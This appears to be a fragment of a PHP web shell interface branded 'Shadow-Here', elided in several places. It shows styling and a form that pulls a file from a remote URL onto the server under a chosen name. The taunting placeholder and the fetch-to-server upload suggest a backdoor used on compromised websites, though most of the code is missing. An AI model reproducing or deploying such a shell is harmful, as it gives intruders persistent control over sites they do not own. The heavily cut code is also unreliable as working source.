...
<head>
    ...
    <style>
        ...
        body {
            background-image: url('https://i.ibb.co/KjWbQ5K2/digital-art-artwork-women-cityscape-wallpaper-59b0881d51fa2dfbf647a81ff071b6dd.jpg'); 
...
<center>
<font face="Bungee" size="5">Shadow-Here</font></center>
...
<input type="text" name="darilink" class="up" placeholder="SammyIsNotYourSecurity!">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
echo "</table><br>";
